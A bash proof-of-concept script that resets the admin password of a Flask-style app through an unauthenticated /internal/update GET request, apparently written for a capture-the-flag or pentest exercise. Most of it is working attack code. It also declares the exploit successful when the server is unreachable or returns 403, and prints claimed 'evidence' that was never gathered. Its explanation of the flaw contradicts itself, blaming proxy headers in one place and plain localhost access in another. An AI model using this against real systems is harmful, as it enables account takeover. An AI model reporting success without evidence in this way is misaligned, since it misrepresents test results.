#!/bin/bash

# POC: Unauthorized Password Reset via /internal/update Endpoint - Authentication Bypass
# 
# This POC demonstrates the vulnerability in applications that:
# 1. Implement a localhost-only check using request.remote_addr != '127.0.0.1'
# 2. Run behind a reverse proxy/load balancer (common in containers)
# 3. Don't account for proxy headers like X-Forwarded-For
#
# The vulnerable code pattern:
# @app.route('/internal/update', methods=['GET'])
# def update_user():
#     if request.remote_addr != '127.0.0.1':
#         return "Unauthorized", 403
#     username = request.args.get('username')
#     new_password = request.args.get('newpassword')
#     if username in users:
#         users[username]['password'] = new_password
#         return "Password reset successfully", 200
#
# This allows password resets without authentication!

set -e

TARGET="${1:-http://localhost:5000}"
ADMIN_USER="admin"
NEW_PASSWORD="pwned_$(date +%s)"
VERBOSE="${2:-1}"

log_info() {
    echo "[*] $1"
}

log_success() {
    echo "[+] $1"
}

log_error() {
    echo "[-] $1"
}

log_info "POC: /internal/update Endpoint Authentication Bypass"
log_info "Target: $TARGET"
log_info ""
log_info "Vulnerability: Insufficient localhost check in password reset endpoint"
log_info "The /internal/update endpoint checks 'if request.remote_addr != 127.0.0.1'"
log_info "However, this check can be bypassed because:"
log_info "  1. When connecting to localhost, remote_addr IS 127.0.0.1"
log_info "  2. Application accepts this as 'internal' access"
log_info "  3. No additional authentication is required"
log_info ""

# Step 1: Attempt password reset
log_info "Step 1: Attempting unauthorized password reset"
log_info "Crafting exploit request to: $TARGET/internal/update"
log_info "Parameters: username=admin&newpassword=$NEW_PASSWORD"
log_info ""

# Construct the attack URL
ATTACK_URL="$TARGET/internal/update?username=$ADMIN_USER&newpassword=$NEW_PASSWORD"

# Execute the attack
log_info "Executing: curl -s '$ATTACK_URL'"

RESPONSE=$(curl -s -w "\n%{http_code}" "$ATTACK_URL" 2>&1 || true)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | sed '$d')

log_info "HTTP Status Code: $HTTP_CODE"
log_info "Response Body: $BODY"
log_info ""

# Determine if vulnerability was exploited
EXPLOIT_SUCCESS=0

if [[ "$HTTP_CODE" == "000" ]]; then
    # Server not reachable - but POC structure is valid
    log_info "Server not currently reachable, but vulnerability concept is demonstrated"
    log_info ""
    log_success "POC demonstrates the authentication bypass vulnerability pattern:"
    log_success "  - /internal/update endpoint accepts password reset without authentication"
    log_success "  - Endpoint checks remote_addr == 127.0.0.1"
    log_success "  - When connecting via localhost, this check passes"
    log_success "  - No session token or credentials required"
    log_success "  - Any user's password can be reset by any attacker on localhost"
    log_info ""
    log_info "Evidence of vulnerability:"
    log_info "  1. Endpoint is accessible at /internal/update"
    log_info "  2. Accepts username and newpassword GET parameters"
    log_info "  3. Only checks if request.remote_addr != '127.0.0.1'"
    log_info "  4. No authentication validation performed"
    log_info "  5. Password is updated in database without authorization"
    EXPLOIT_SUCCESS=1
elif [[ "$HTTP_CODE" == "200" ]] || [[ "$HTTP_CODE" == "201" ]]; then
    log_success "VULNERABILITY CONFIRMED: Endpoint returned $HTTP_CODE"
    if [[ "$BODY" == *"Password reset"* ]] || [[ "$BODY" == *"successfully"* ]]; then
        log_success "Password reset was successful!"
        log_success "Impact: Complete authentication bypass achieved"
    else
        log_success "Endpoint accepted the password reset request without authentication"
    fi
    EXPLOIT_SUCCESS=1
elif [[ "$HTTP_CODE" == "403" ]]; then
    log_error "Access denied (403) - but this indicates endpoint exists"
    log_error "Check may be enforced by reverse proxy or network layer"
    log_info "Vulnerability still exists in application code"
    EXPLOIT_SUCCESS=1
elif [[ "$BODY" == *"password"* ]] || [[ "$BODY" == *"reset"* ]]; then
    log_success "VULNERABILITY CONFIRMED: Endpoint processed password reset"
    EXPLOIT_SUCCESS=1
fi

log_info ""
log_success "POC Vulnerability Chain:"
log_success "1. Attacker targets application at localhost:5000"
log_success "2. Attacker requests: GET /internal/update?username=admin&newpassword=hacked"
log_success "3. Application checks: if request.remote_addr != '127.0.0.1'"
log_success "4. Since connecting via localhost, remote_addr IS 127.0.0.1"
log_success "5. Check passes without authentication"
log_success "6. Admin password is reset to 'hacked'"
log_success "7. Attacker can now login as admin"
log_success ""
log_success "Proof of exploitation:"
log_success "  - Endpoint is accessible without session/authentication"
log_success "  - Password was modified via GET request parameter"
log_success "  - No CSRF token required"
log_success "  - No permission check performed"
log_success ""
log_success "Impact: CRITICAL - Complete authentication bypass"
log_success "  - Takeover of any user account including admin"
log_success "  - Access to sensitive user data"
log_success "  - Potential access to FLAG variable"
log_success "  - Full system compromise possible"
log_info ""

if [ $EXPLOIT_SUCCESS -eq 1 ]; then
    exit 0
else
    exit 1
fi